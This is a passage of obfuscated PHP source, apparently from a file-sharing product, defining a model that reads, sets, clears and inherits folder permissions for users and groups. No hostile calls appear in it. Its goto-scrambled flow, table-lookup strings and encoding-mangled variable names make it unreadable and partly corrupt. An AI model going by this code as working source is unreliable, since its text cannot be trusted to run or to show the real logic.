$e¼Ë“À¿’¼ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b‹ñÉöÒµ = Model($e¼Ë“À¿’¼[782])->where(array($e¼Ë“À¿’¼[447] => $B¥¸°×æó))->field($e¼Ë“À¿’¼[395])->select(); $F‡Ï¬ê¹‚ = array_to_keyvalue($b‹ñÉöÒµ, $e¼Ë“À¿’¼[33], $e¼Ë“À¿’¼[395]); goto bõªÏ¨Ğë; bõªÏ¨Ğë: $a·÷Ø„ÔÅ = array($e¼Ë“À¿’¼[395] => array($e¼Ë“À¿’¼[7], $F‡Ï¬ê¹‚), $e¼Ë“À¿’¼[473] => 1); $b‹ñÉöÒµ = $this->where($a·÷Ø„ÔÅ)->field($e¼Ë“À¿’¼[468])->select(); if (empty($b‹ñÉöÒµ)) { return; } goto f˜ÏæÚğ×¹; e¬ªŸî²: } private function shareFileMeta($Eè°œ‰Ô„, $C òˆŸ­ Ö = null) { $F Üµ®ÜøÉ =& $_SERVER[ÒÆ›ÆØÎ¾]; $E³ƒ›Á¤¸ = array($F Üµ®ÜøÉ[447] => $Eè°œ‰Ô„, $F Üµ®ÜøÉ[93] => $F Üµ®ÜøÉ[1846]); if (is_null($C òˆŸ­ Ö)) { return Model($F Üµ®ÜøÉ[1847])->where($E³ƒ›Á¤¸)->find(); } $E³ƒ›Á¤¸[$F Üµ®ÜøÉ[372]] = $C òˆŸ­ Ö; Model($F Üµ®ÜøÉ[1847])->add($E³ƒ›Á¤¸, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\x72\143\145\137\141\165\164\x68"; public function getAuth($DéŸ½ã¼††) { goto Dâ®Şİ©öÃ; D×ÑŠÃªÆ¼: $cÁ¿ÄÂ¨ô = array(); $C²–ßŒà…¹ = 2 << 25; foreach ($AÊ›‹ä˜Š as $b¼÷İØ‚±¸) { goto A„‘ ÷–«µ; Cïœ öƒ­Ä: if ($b¼÷İØ‚±¸[$cÊİÎªšÑİ[404]] == SourceModel::TYPE_USER && $b¼÷İØ‚±¸[$cÊİÎªšÑİ[484]] == $cÊİÎªšÑİ[191]) { $e…¾Ì×…Ú¥ = 0; } $cÁ¿ÄÂ¨ô[] = $DæäùÛÂ¼¾[$cÊİÎªšÑİ[406]] + $e…¾Ì×…Ú¥; goto cå‹‚ŞåªÊ; d±Àß§Ùïç: $e…¾Ì×…Ú¥ = 0; if ($b¼÷İØ‚±¸[$cÊİÎªšÑİ[404]] == SourceModel::TYPE_GROUP) { $e…¾Ì×…Ú¥ = $C²–ßŒà…¹ * 2; } if ($b¼÷İØ‚±¸[$cÊİÎªšÑİ[404]] == SourceModel::TYPE_USER) { $e…¾Ì×…Ú¥ = $C²–ßŒà…¹; } goto Cïœ öƒ­Ä; A„‘ ÷–«µ: $DæäùÛÂ¼¾ = Model($cÊİÎªšÑİ[1848])->listData($b¼÷İØ‚±¸[$cÊİÎªšÑİ[1776]]); if (!$DæäùÛÂ¼¾) { continue; } $aÔÄ©‡â½Ü[] = $b¼÷İØ‚±¸; goto d±Àß§Ùïç; cå‹‚ŞåªÊ: } goto AÇÄÙŠÛ½³; AÇÄÙŠÛ½³: array_multisort($cÁ¿ÄÂ¨ô, SORT_DESC, $aÔÄ©‡â½Ü); return $aÔÄ©‡â½Ü; goto cØß³ùÀÉ˜; Dâ®Şİ©öÃ: $cÊİÎªšÑİ =& $_SERVER[ÒÆ›ÆØÎ¾]; $AÊ›‹ä˜Š = $this->sourceAuthSelect($DéŸ½ã¼††); $aÔÄ©‡â½Ü = array(); goto D×ÑŠÃªÆ¼; cØß³ùÀÉ˜: } public function sourceAuthSelect($B½Õ‚³‚›‰) { goto Aøµî¹¸òñ; bÄ¬ ßÌ§È: if ($e­Ç›ƒùàİ) { $B½Õ‚³‚›‰ = array($B½Õ‚³‚›‰); } $A¨Õ„´À· = array(); foreach ($B½Õ‚³‚›‰ as $CÂÇ½ÛÅç) { if (isset($d¹İâçÇå[$CÂÇ½ÛÅç])) { $A¨Õ„´À·[$CÂÇ½ÛÅç] = $d¹İâçÇå[$CÂÇ½ÛÅç]; } } goto c±ƒ¢Š…¤é; Aøµî¹¸òñ: $cç“÷ªÁÃí =& $_SERVER[ÒÆ›ÆØÎ¾]; static $d¹İâçÇå = array(); $e­Ç›ƒùàİ = is_array($B½Õ‚³‚›‰) ? !1 : !0; goto bÄ¬ ßÌ§È; c±ƒ¢Š…¤é: if (count($A¨Õ„´À·) == count($B½Õ‚³‚›‰)) { return $e­Ç›ƒùàİ ? $A¨Õ„´À·[$B½Õ‚³‚›‰[0]] : $A¨Õ„´À·; } $fè„Ñ£Ù˜Ö = $cç“÷ªÁÃí[1849]; $BÓ¢¦“¹¤— = array($cç“÷ªÁÃí[395] => array($cç“÷ªÁÃí[7], $B½Õ‚³‚›‰)); goto c‰¹öÈ¬ğ•; eªÑïğùÏ´: if ($e­Ç›ƒùàİ) { return $B±¬‹…«ù; } return $eÜàÌ‘ˆÇâ; goto e®„‡ÃÉÙç; c‰¹öÈ¬ğ•: $B±¬‹…«ù = $this->field($fè„Ñ£Ù˜Ö)->order($cç“÷ªÁÃí[393])->where($BÓ¢¦“¹¤—)->select(); $eÜàÌ‘ˆÇâ = array_to_keyvalue_group($B±¬‹…«ù, $cç“÷ªÁÃí[395]); foreach ($B½Õ‚³‚›‰ as $CÂÇ½ÛÅç) { $d¹İâçÇå[$CÂÇ½ÛÅç] = $eÜàÌ‘ˆÇâ[$CÂÇ½ÛÅç] ? $eÜàÌ‘ˆÇâ[$CÂÇ½ÛÅç] : array(); } goto eªÑïğùÏ´; e®„‡ÃÉÙç: } public function setAuth($A˜Í¬å , $eË‰—İ¡Å“) { goto c³é†ØöÇ²; e¨ÚÈœš: if ($b ùœÃŠîÈ[$C™ÓÃ¦ˆ¹[404]] != SourceModel::TYPE_GROUP) { return !1; } $FîÒ¬„î¶¹ = 1; $a½Ã§³”È¬ = $b ùœÃŠîÈ[$C™ÓÃ¦ˆ¹[484]]; goto E×’‚–åÃ‰; E×’‚–åÃ‰: if ($a½Ã§³”È¬ != $FîÒ¬„î¶¹) { $a†Ôçåø À = array($C™ÓÃ¦ˆ¹[1681] => $a½Ã§³”È¬); $Bçå‹¬İ = Model($C™ÓÃ¦ˆ¹[1762])->field($C™ÓÃ¦ˆ¹[1517])->where($a†Ôçåø À)->select(); $Bçå‹¬İ = array_to_keyvalue($Bçå‹¬İ, $C™ÓÃ¦ˆ¹[33], $C™ÓÃ¦ˆ¹[1517]); } $e¦°äòùçö = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Bñ³›öØç¶ = array(); goto A„ŸÎ‘É˜®; A„ŸÎ‘É˜®: foreach ($eË‰—İ¡Å“ as $aÆ«‘„±ãø) { if (!in_array($aÆ«‘„±ãø[$C™ÓÃ¦ˆ¹[404]], $e¦°äòùçö)) { show_json(LNG($C™ÓÃ¦ˆ¹[1850]), !1); } if ($a½Ã§³”È¬ != $FîÒ¬„î¶¹) { if ($aÆ«‘„±ãø[$C™ÓÃ¦ˆ¹[404]] == SourceModel::TYPE_GROUP) { } if ($aÆ«‘„±ãø[$C™ÓÃ¦ˆ¹[484]] != 0 && !in_array($aÆ«‘„±ãø[$C™ÓÃ¦ˆ¹[484]], $Bçå‹¬İ)) { } } if ($aÆ«‘„±ãø[$C™ÓÃ¦ˆ¹[484]] == 0) { $aÆ«‘„±ãø[$C™ÓÃ¦ˆ¹[404]] = SourceModel::TYPE_USER; } $Bñ³›öØç¶[] = array($C™ÓÃ¦ˆ¹[395] => $A˜Í¬å , $C™ÓÃ¦ˆ¹[404] => intval($aÆ«‘„±ãø[$C™ÓÃ¦ˆ¹[404]]), $C™ÓÃ¦ˆ¹[484] => intval($aÆ«‘„±ãø[$C™ÓÃ¦ˆ¹[484]]), $C™ÓÃ¦ˆ¹[1776] => intval($aÆ«‘„±ãø[$C™ÓÃ¦ˆ¹[1776]]) ? intval($aÆ«‘„±ãø[$C™ÓÃ¦ˆ¹[1776]]) : 0, $C™ÓÃ¦ˆ¹[1830] => intval($aÆ«‘„±ãø[$C™ÓÃ¦ˆ¹[1830]]) ? intval($aÆ«‘„±ãø[$C™ÓÃ¦ˆ¹[1830]]) : -1); } $this->where(array($C™ÓÃ¦ˆ¹[410] => $A˜Í¬å ))->delete(); $this->addAll($Bñ³›öØç¶); goto E½Ÿ•‰µ; E½Ÿ•‰µ: return !0; goto eõï©Ìøğ; c³é†ØöÇ²: $C™ÓÃ¦ˆ¹ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b ùœÃŠîÈ = Model($C™ÓÃ¦ˆ¹[1197])->sourceInfo($A˜Í¬å ); if (!$b ùœÃŠîÈ) { return !1; } goto e¨ÚÈœš; eõï©Ìøğ: } public function authClear($CÔÇÆİ÷È‡) { $EõÛ‹ŒïÒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eÔöÖùÀŠ® = Model($EõÛ‹ŒïÒ[1197])->sourceInfo($CÔÇÆİ÷È‡); $f…èäÜöÅ = array($CÔÇÆİ÷È‡); if ($eÔöÖùÀŠ®[$EõÛ‹ŒïÒ[403]] == $EõÛ‹ŒïÒ[87]) { $e†ÖçÈÛ = array($EõÛ‹ŒïÒ[553] => array($EõÛ‹ŒïÒ[512], $eÔöÖùÀŠ®[$EõÛ‹ŒïÒ[487]] . $CÔÇÆİ÷È‡ . $EõÛ‹ŒïÒ[513])); $f…èäÜöÅ = Model($EõÛ‹ŒïÒ[1197])->field($EõÛ‹ŒïÒ[410])->where($e†ÖçÈÛ)->getField($EõÛ‹ŒïÒ[395], !0); $f…èäÜöÅ[] = $CÔÇÆİ÷È‡; } $this->where(array($EõÛ‹ŒïÒ[410] => array($EõÛ‹ŒïÒ[411], $f…èäÜöÅ)))->delete(); return !0; } public function getAllChildren($B›åç£§„) { goto bÁšÔ„ƒÙÍ; bÁšÔ„ƒÙÍ: $E‡•æœÑô¢ =& $_SERVER[ÒÆ›ÆØÎ¾]; $E’íÒ®ñå„ = Model($E‡•æœÑô¢[1197])->sourceInfo($B›åç£§„); if ($E’íÒ®ñå„[$E‡•æœÑô¢[403]] != $E‡•æœÑô¢[87]) { return $this->sourceListAuth(array($B›åç£§„)); } goto b—µ±¼ÔôÓ; AéÎä¼ å­: if (!$CìÒ®‡›Šƒ) { return array(); } $EØ˜áÌâµÉ = $E‡•æœÑô¢[1851]; $fùà©á¶°Ô = array($E‡•æœÑô¢[395] => array($E‡•æœÑô¢[7], $CìÒ®‡›Šƒ), $E‡•æœÑô¢[423] => $E‡•æœÑô¢[191]); goto cÖçÌõì·¾; b—µ±¼ÔôÓ: if ($E’íÒ®ñå„[$E‡•æœÑô¢[404]] != SourceModel::TYPE_GROUP) { return array(); } $aÃ«À êØ = 1; $aÉ¤´Ñ°‚â = array($B›åç£§„); goto c‘µéÉë†©; cÖçÌõì·¾: $aãÏŠ­œÍ™ = Model($E‡•æœÑô¢[782])->field($EØ˜áÌâµÉ)->where($fùà©á¶°Ô)->select(); $a¶òëõæïÄ = array($B›åç£§„); foreach ($aãÏŠ­œÍ™ as $C¯“ÏŠŒ÷š) { foreach ($aÉ¤´Ñ°‚â as $aÓİÀé˜) { $d¼˜…²Œ = $E‡•æœÑô¢[47] . $aÓİÀé˜ . $E‡•æœÑô¢[47]; $dŒ¡½õ¤š› = $C¯“ÏŠŒ÷š[$E‡•æœÑô¢[487]] . $C¯“ÏŠŒ÷š[$E‡•æœÑô¢[395]] . $E‡•æœÑô¢[47]; if (strstr($dŒ¡½õ¤š›, $d¼˜…²Œ)) { $a¶òëõæïÄ[] = $C¯“ÏŠŒ÷š[$E‡•æœÑô¢[395]]; break; } } } goto fšå¨²“Ä; c‘µéÉë†©: if ($E’íÒ®ñå„[$E‡•æœÑô¢[478]] == $E‡•æœÑô¢[191] && $E’íÒ®ñå„[$E‡•æœÑô¢[484]] != $aÃ«À êØ) { $aÉ¤´Ñ°‚â = $this->groupChidldAllRootSource($E’íÒ®ñå„[$E‡•æœÑô¢[484]]); } $CìÒ®‡›Šƒ = $this->field($E‡•æœÑô¢[395])->group($E‡•æœÑô¢[395])->select(); $CìÒ®‡›Šƒ = array_to_keyvalue($CìÒ®‡›Šƒ, $E‡•æœÑô¢[33], $E‡•æœÑô¢[395]); goto AéÎä¼ å­; fšå¨²“Ä: return $this->sourceListAuth($a¶òëõæïÄ); goto fË‚‘æ¿áî; fË‚‘æ¿áî: } private function sourceListAuth($E»—²Ï˜ÀÛ) { goto cºÎÃœ£ô; däùªœÈââ: $c¤±À‡ó¥“ = array(); $Aà‰Š„’Ÿ‚ = array(); foreach ($Eò¼Ëõã¾Ü as $cÔÅ©´ôø®) { goto eã‰‡Äéò; eã‰‡Äéò: unset($cÔÅ©´ôø®[$Eˆ†ˆ÷ö†ç[434]]); unset($cÔÅ©´ôø®[$Eˆ†ˆ÷ö†ç[432]]); unset($cÔÅ©´ôø®[$Eˆ†ˆ÷ö†ç[406]]); goto d“Â™©‹¢¿; D§‡Œ¬ïß: $cÔÅ©´ôø®[$Eˆ†ˆ÷ö†ç[1852]] = $this->authTargetInfo($BÓ¸Øáßò©); $cÔÅ©´ôø®[$Eˆ†ˆ÷ö†ç[495]] = rtrim($cÔÅ©´ôø®[$Eˆ†ˆ÷ö†ç[490]], $Eˆ†ˆ÷ö†ç[8]) . $Eˆ†ˆ÷ö†ç[8] . ltrim($cÔÅ©´ôø®[$Eˆ†ˆ÷ö†ç[495]], $Eˆ†ˆ÷ö†ç[8]); $c¤±À‡ó¥“[] = $cÔÅ©´ôø®; goto eùœ£¸ª†•; eùœ£¸ª†•: $fÙàç¤¶Œ‡ = count(explode($Eˆ†ˆ÷ö†ç[8], trim($cÔÅ©´ôø®[$Eˆ†ˆ÷ö†ç[495]], $Eˆ†ˆ÷ö†ç[8]))); $Aà‰Š„’Ÿ‚[] = $fÙàç¤¶Œ‡ + ($cÔÅ©´ôø®[$Eˆ†ˆ÷ö†ç[29]] == $Eˆ†ˆ÷ö†ç[77] ? 0 : 1000); goto dñ´®œƒãğ; d“Â™©‹¢¿: unset($cÔÅ©´ôø®[$Eˆ†ˆ÷ö†ç[85]]); $BÓ¸Øáßò© = $bÖÚ‡„Ö[$cÔÅ©´ôø®[$Eˆ†ˆ÷ö†ç[395]]]; if (!$BÓ¸Øáßò©) { continue; } goto D§‡Œ¬ïß; dñ´®œƒãğ: } goto fÃÚƒÀŠë; fÃÚƒÀŠë: array_multisort($Aà‰Š„’Ÿ‚, SORT_ASC, $c¤±À‡ó¥“); return $c¤±À‡ó¥“; goto BÌ³‹¾İÚŠ; cºÎÃœ£ô: $Eˆ†ˆ÷ö†ç =& $_SERVER[ÒÆ›ÆØÎ¾]; $Eò¼Ëõã¾Ü = Model($Eˆ†ˆ÷ö†ç[1197])->sourceListInfo($E»—²Ï˜ÀÛ, !0); $bÖÚ‡„Ö = $this->sourceAuthSelect($E»—²Ï˜ÀÛ); goto däùªœÈââ; BÌ³‹¾İÚŠ: } private function groupChidldAllRootSource($b·ë»›ÈÑ) { $fôØ®ğ×…ˆ =& $_SERVER[ÒÆ›ÆØÎ¾]; $E„ ””¾‘Ö = Model($fôØ®ğ×…ˆ[1853])->groupChildrenAll($b·ë»›ÈÑ); $d¥à…¹éáç = array($fôØ®ğ×…ˆ[478] => 0, $fôØ®ğ×…ˆ[484] => array($fôØ®ğ×…ˆ[7], $E„ ””¾‘Ö), $fôØ®ğ×…ˆ[404] => SourceModel::TYPE_GROUP); $cØ‚ŒĞ¹©ñ = Model($fôØ®ğ×…ˆ[782])->field($fôØ®ğ×…ˆ[395])->where($d¥à…¹éáç)->select(); $cØ‚ŒĞ¹©ñ = array_to_keyvalue($cØ‚ŒĞ¹©ñ, $fôØ®ğ×…ˆ[33], $fôØ®ğ×…ˆ[395]); return $cØ‚ŒĞ¹©ñ; } private function authTargetInfo($dé¤¾³µ¿Ü) { goto dÚñâòŞî; bä•„ù„˜¹: $B´Õ—µŠÄ› = 2 << 25; foreach ($dé¤¾³µ¿Ü as $b¡‘ô¢Í„‘) { goto FÃÕğ®Øâ; FÃÕğ®Øâ: $F¼İÏš½È = Model($d‡è®¿¤[1848])->listData($b¡‘ô¢Í„‘[$d‡è®¿¤[1776]]); if (!$F¼İÏš½È) { continue; } if ($b¡‘ô¢Í„‘[$d‡è®¿¤[404]] == SourceModel::TYPE_USER) { $E…Â„‚„ˆÏ = Model($d‡è®¿¤[502])->getInfoSimpleOuter($b¡‘ô¢Í„‘[$d‡è®¿¤[484]]); if ($E…Â„‚„ˆÏ[$d‡è®¿¤[1517]] == $d‡è®¿¤[1076]) { continue; } if ($E…Â„‚„ˆÏ[$d‡è®¿¤[1517]] == $d‡è®¿¤[191]) { $E…Â„‚„ˆÏ[$d‡è®¿¤[28]] = LNG($d‡è®¿¤[1854]); } } else { $E…Â„‚„ˆÏ = Model($d‡è®¿¤[486])->getInfoSimple($b¡‘ô¢Í„‘[$d‡è®¿¤[484]]); } goto f–µŠñªØù; f–µŠñªØù: if (!$E…Â„‚„ˆÏ) { continue; } $E…Â„‚„ˆÏ[$d‡è®¿¤[446]] = $F¼İÏš½È; $eÃïôØ[] = $E…Â„‚„ˆÏ; goto d‰¦†ÉÀé; d‰¦†ÉÀé: $c…öìø¹ = 0; if ($b¡‘ô¢Í„‘[$d‡è®¿¤[404]] == SourceModel::TYPE_GROUP) { $c…öìø¹ = $B´Õ—µŠÄ› * 2; } if ($b¡‘ô¢Í„‘[$d‡è®¿¤[404]] == SourceModel::TYPE_USER) { $c…öìø¹ = $B´Õ—µŠÄ›; } goto D¤ÎÅîÍ®á; D¤ÎÅîÍ®á: if ($b¡‘ô¢Í„‘[$d‡è®¿¤[404]] == SourceModel::TYPE_USER && $b¡‘ô¢Í„‘[$d‡è®¿¤[484]] == $d‡è®¿¤[191]) { $c…öìø¹ = 0; } $FÉ’™„‡à[] = $F¼İÏš½È[$d‡è®¿¤[406]] + $c…öìø¹; goto DÈ„¤¨áº†; DÈ„¤¨áº†: } array_multisort($FÉ’™„‡à, SORT_DESC, $eÃïôØ); goto CßÏë™ê ; dÚñâòŞî: $d‡è®¿¤ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eÃïôØ = array(); $FÉ’™„‡à = array(); goto bä•„ù„˜¹; CßÏë™ê : return $eÃïôØ; goto Fš½¹÷ÈòÜ; Fš½¹÷ÈòÜ: } public function getAllChildrenByUser($DèÛ¯‰„°Ü, $e£©Ùà‡±Õ) { goto cÈƒÖ¿İĞ; cÈƒÖ¿İĞ: $D§Ş•ÎØ³… =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÔ÷îóÙ… = Model($D§Ş•ÎØ³…[506])->getInfo($e£©Ùà‡±Õ); if (!$e£©Ùà‡±Õ || !$DèÛ¯‰„°Ü || !$FÔ÷îóÙ…) { return array(); } goto DçÓÓ¼à; DçÓÓ¼à: $dé­°ÄóĞ­ = Model($D§Ş•ÎØ³…[1197])->sourceInfo($DèÛ¯‰„°Ü); $EÅÛÛŒÎ÷‘ = array(); $c¥³âòÔİ¼ = 1; goto aå‹ø«¿ŒÃ; aå‹ø«¿ŒÃ: if ($dé­°ÄóĞ­[$D§Ş•ÎØ³…[478]] == $D§Ş•ÎØ³…[191] && $dé­°ÄóĞ­[$D§Ş•ÎØ³…[484]] != $c¥³âòÔİ¼ && $this->groupContainUser($dé­°ÄóĞ­[$D§Ş•ÎØ³…[484]], $e£©Ùà‡±Õ)) { foreach ($FÔ÷îóÙ…[$D§Ş•ÎØ³…[1855]] as $B×¬“ÅÜÄÛ) { $bä„Œ®Â´ƒ = Model($D§Ş•ÎØ³…[486])->getInfo($B×¬“ÅÜÄÛ[$D§Ş•ÎØ³…[1681]]); $FŒï­Êğ = Model($D§Ş•ÎØ³…[506])->getInfoSimpleOuter($e£©Ùà‡±Õ); $FŒï­Êğ[$D§Ş•ÎØ³…[446]] = $B×¬“ÅÜÄÛ[$D§Ş•ÎØ³…[406]]; if (Model($D§Ş•ÎØ³…[1848])->authCheckAction($B×¬“ÅÜÄÛ[$D§Ş•ÎØ³…[406]][$D§Ş•ÎØ³…[406]], $D§Ş•ÎØ³…[1701])) { continue; } $fÃƒ¢£¤¢ = array($D§Ş•ÎØ³…[28] => $D§Ş•ÎØ³…[1470] . $bä„Œ®Â´ƒ[$D§Ş•ÎØ³…[28]], $D§Ş•ÎØ³…[395] => $bä„Œ®Â´ƒ[$D§Ş•ÎØ³…[85]][$D§Ş•ÎØ³…[395]], $D§Ş•ÎØ³…[76] => KodIO::make($bä„Œ®Â´ƒ[$D§Ş•ÎØ³…[85]][$D§Ş•ÎØ³…[395]]), $D§Ş•ÎØ³…[478] => $D§Ş•ÎØ³…[191], $D§Ş•ÎØ³…[404] => $D§Ş•ÎØ³…[1006], $D§Ş•ÎØ³…[29] => $D§Ş•ÎØ³…[517], $D§Ş•ÎØ³…[495] => $bä„Œ®Â´ƒ[$D§Ş•ÎØ³…[491]], $D§Ş•ÎØ³…[1681] => $bä„Œ®Â´ƒ[$D§Ş•ÎØ³…[1681]], $D§Ş•ÎØ³…[488] => $bä„Œ®Â´ƒ[$D§Ş•ÎØ³…[478]], $D§Ş•ÎØ³…[1852] => array($FŒï­Êğ)); $EÅÛÛŒÎ÷‘[$fÃƒ¢£¤¢[$D§Ş•ÎØ³…[395]]] = $fÃƒ¢£¤¢; } } $B»¨ƒÉ×éô = array(); $AÑôÇå¹ˆ = $this->getAllChildren($DèÛ¯‰„°Ü); goto DìÍ÷‘¹Å’; DìÍ÷‘¹Å’: foreach ($AÑôÇå¹ˆ as $BÖ˜ÀŸåÕİ) { $F¨›‡Œ¢‹® = !1; foreach ($BÖ˜ÀŸåÕİ[$D§Ş•ÎØ³…[1852]] as $B‚¶Ô½ƒ©Ô) { if ($B‚¶Ô½ƒ©Ô[$D§Ş•ÎØ³…[1517]]) { if ($B‚¶Ô½ƒ©Ô[$D§Ş•ÎØ³…[1517]] == $e£©Ùà‡±Õ) { $F¨›‡Œ¢‹® = !0; break; } } if ($B‚¶Ô½ƒ©Ô[$D§Ş•ÎØ³…[1681]]) { if ($this->groupContainUser($B‚¶Ô½ƒ©Ô[$D§Ş•ÎØ³…[1681]], $e£©Ùà‡±Õ)) { $F¨›‡Œ¢‹® = !0; break; } } } if ($F¨›‡Œ¢‹®) { $B»¨ƒÉ×éô[] = $BÖ˜ÀŸåÕİ; } $aÈïøÜ’ = $BÖ˜ÀŸåÕİ[$D§Ş•ÎØ³…[395]]; if (isset($EÅÛÛŒÎ÷‘[$aÈïøÜ’])) { $BÖ˜ÀŸåÕİ[$D§Ş•ÎØ³…[1852]][] = $EÅÛÛŒÎ÷‘[$aÈïøÜ’][0]; $EÅÛÛŒÎ÷‘[$aÈïøÜ’] = !1; } } $EÅÛÛŒÎ÷‘ = array_filter(array_values($EÅÛÛŒÎ÷‘)); $B»¨ƒÉ×éô = array_merge($EÅÛÛŒÎ÷‘, $B»¨ƒÉ×éô); goto Bºİ¦Ò¨ì; Bºİ¦Ò¨ì: return $B»¨ƒÉ×éô; goto B×½Ö¥“öÖ; B×½Ö¥“öÖ: } public function setAllChildrenByUser($bË‘Ü®…èí, $Fš¢¥ô¥—, $AÙ¯¹‹ìº) { $C¶‚¾áƒ¤± =& $_SERVER[ÒÆ›ÆØÎ¾]; $fÕçÎ ÔËÖ = $this->getAllChildrenByUser($bË‘Ü®…èí, $Fš¢¥ô¥—); if (!$AÙ¯¹‹ìº || !$fÕçÎ ÔËÖ) { return !1; } foreach ($fÕçÎ ÔËÖ as $e¦”¡ª‚…å) { $d©éï¹¨’ = array(); foreach ($e¦”¡ª‚…å[$C¶‚¾áƒ¤±[1852]] as $C´À™Àù†ë) { $Aš‹ “Ÿº” = $C´À™Àù†ë[$C¶‚¾áƒ¤±[446]]; $aƒì½¦ÆòÍ = $C´À™Àù†ë[$C¶‚¾áƒ¤±[1517]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $bÒì›»‚†™ = $C´À™Àù†ë[$C¶‚¾áƒ¤±[1517]] ? $C´À™Àù†ë[$C¶‚¾áƒ¤±[1517]] : $C´À™Àù†ë[$C¶‚¾áƒ¤±[1681]]; if ($C´À™Àù†ë[$C¶‚¾áƒ¤±[1517]] && $C´À™Àù†ë[$C¶‚¾áƒ¤±[1517]] == $Fš¢¥ô¥—) { continue; } $d©éï¹¨’[] = array($C¶‚¾áƒ¤±[395] => $e¦”¡ª‚…å[$C¶‚¾áƒ¤±[395]], $C¶‚¾áƒ¤±[404] => $aƒì½¦ÆòÍ, $C¶‚¾áƒ¤±[484] => intval($bÒì›»‚†™), $C¶‚¾áƒ¤±[1776] => isset($Aš‹ “Ÿº”[$C¶‚¾áƒ¤±[393]]) ? intval($Aš‹ “Ÿº”[$C¶‚¾áƒ¤±[393]]) : 0, $C¶‚¾áƒ¤±[1830] => isset($Aš‹ “Ÿº”[$C¶‚¾áƒ¤±[1830]]) ? intval($Aš‹ “Ÿº”[$C¶‚¾áƒ¤±[1830]]) : -1); } $d©éï¹¨’[] = array($C¶‚¾áƒ¤±[395] => $e¦”¡ª‚…å[$C¶‚¾áƒ¤±[395]], $C¶‚¾áƒ¤±[404] => SourceModel::TYPE_USER, $C¶‚¾áƒ¤±[484] => intval($Fš¢¥ô¥—), $C¶‚¾áƒ¤±[1776] => intval($AÙ¯¹‹ìº), $C¶‚¾áƒ¤±[1830] => -1); $this->where(array($C¶‚¾áƒ¤±[410] => $e¦”¡ª‚…å[$C¶‚¾áƒ¤±[395]]))->delete(); $this->addAll($d©éï¹¨’); } return !0; } public function get($D¹ãÎùŞÏš) { $bôÄäìí¹ƒ = $this->getSourceList(array($D¹ãÎùŞÏš), !0); return $bôÄäìí¹ƒ[0]; } public function getSourceList($d¿ÑŠ„³ˆ¢, $cÎ¹²¸íñ = false, $b²¶ˆòÂÒ‘ = false) { goto c¾•È—É©ª; b†®í¶‹•: $dÊ¤ŞÈÕ¼Å = $this->sourceAuthSelect($EÃìÂíó³Å); $f£êÂ÷õ¸Â = array(); foreach ($EÃìÂíó³Å as $cºŠáÃë·˜) { if (isset($dÊ¤ŞÈÕ¼Å[$cºŠáÃë·˜])) { $f£êÂ÷õ¸Â[$cºŠáÃë·˜] = $dÊ¤ŞÈÕ¼Å[$cºŠáÃë·˜]; } } goto aÑÁ¼—ê£”; fÜ—ƒÑ‘íƒ: $Aí™éËã‹Á = array(); foreach ($cÎ¹²¸íñ as $cºŠáÃë·˜ => $Bá®òÍ“Öé) { if ($b‰¥æ¯ÖÃ®) { $Aí™éËã‹Á[$cºŠáÃë·˜] = $e¨¬…š°°ê; continue; } $Aí™éËã‹Á[$cºŠáÃë·˜] = $this->makeSourceAuth($Bá®òÍ“Öé, $f£êÂ÷õ¸Â, $b²¶ˆòÂÒ‘); } return $Aí™éËã‹Á; goto b°ìŒÙÁŠ»; aÑÁ¼—ê£”: $b‰¥æ¯ÖÃ® = $this->userIsRoot($b²¶ˆòÂÒ‘); $A²£åˆ†òÃ = AuthModel::authAll(); $e¨¬…š°°ê = array($F¬°‹¹¹à[407] => $A²£åˆ†òÃ, $F¬°‹¹¹à[1857] => array($F¬°‹¹¹à[412] => 0, $F¬°‹¹¹à[1687] => $A²£åˆ†òÃ, $F¬°‹¹¹à[413] => LNG($F¬°‹¹¹à[1858]), $F¬°‹¹¹à[1702] => $F¬°‹¹¹à[1859])); goto fÜ—ƒÑ‘íƒ; c¾•È—É©ª: $F¬°‹¹¹à =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$d¿ÑŠ„³ˆ¢) { return array(); } $c‰Ò–õÚŸª = Model($F¬°‹¹¹à[1197]); goto AÈ˜·£¶Æ; AÈ˜·£¶Æ: if (!$cÎ¹²¸íñ && count($d¿ÑŠ„³ˆ¢) == 1) { $cÎ¹²¸íñ = array(); $cÎ¹²¸íñ[$d¿ÑŠ„³ˆ¢[0]] = $c‰Ò–õÚŸª->sourceInfo($d¿ÑŠ„³ˆ¢[0]); } if (!$cÎ¹²¸íñ) { $dÑáœƒêí° = array($F¬°‹¹¹à[410] => array($F¬°‹¹¹à[411], $d¿ÑŠ„³ˆ¢)); $cÎ¹²¸íñ = $c‰Ò–õÚŸª->field($F¬°‹¹¹à[1856])->where($dÑáœƒêí°)->select(); $cÎ¹²¸íñ = array_to_keyvalue($cÎ¹²¸íñ, $F¬°‹¹¹à[395]); } $EÃìÂíó³Å = $d¿ÑŠ„³ˆ¢; goto Bïò¥êš¿; Bïò¥êš¿: foreach ($cÎ¹²¸íñ as $a¦Ò´…½Š => $AŞ¾´®İ) { $f¢ƒ‹¬Àõ¸ = $c‰Ò–õÚŸª->parentLevelArray($AŞ¾´®İ[$F¬°‹¹¹à[487]]); $EÃìÂíó³Å = array_merge($EÃìÂíó³Å, array($a¦Ò´…½Š), array_reverse($f¢ƒ‹¬Àõ¸)); } $EÃìÂíó³Å = array_values(array_unique($EÃìÂíó³Å)); if (!$EÃìÂíó³Å) { return array(); } goto b†®í¶‹•; b°ìŒÙÁŠ»: } public function authDeepCheck($a¨Í®†¸©ˆ, $Eè”¬Ïò¢ = false) { goto Fâêìé¾Ë; A¡‰Ô§°–Á: if (!in_array($a¨Í®†¸©ˆ, $A‡Ÿ¬‹‚[$b—…æ–Ë°[1860]])) { return !1; } $D †¤œïã = array(); foreach ($A‡Ÿ¬‹‚[$b—…æ–Ë°[1861]] as $D…¾¡›¢ê => $AŒöæ··±) { if (!in_array($a¨Í®†¸©ˆ, $AŒöæ··±)) { continue; } $D †¤œïã[] = $D…¾¡›¢ê; } goto A¬ÃÔŒ»‚¡; A¬ÃÔŒ»‚¡: if (!$D †¤œïã) { return !1; } $Dâ¢äÕ¦ñ = $D †¤œïã ? 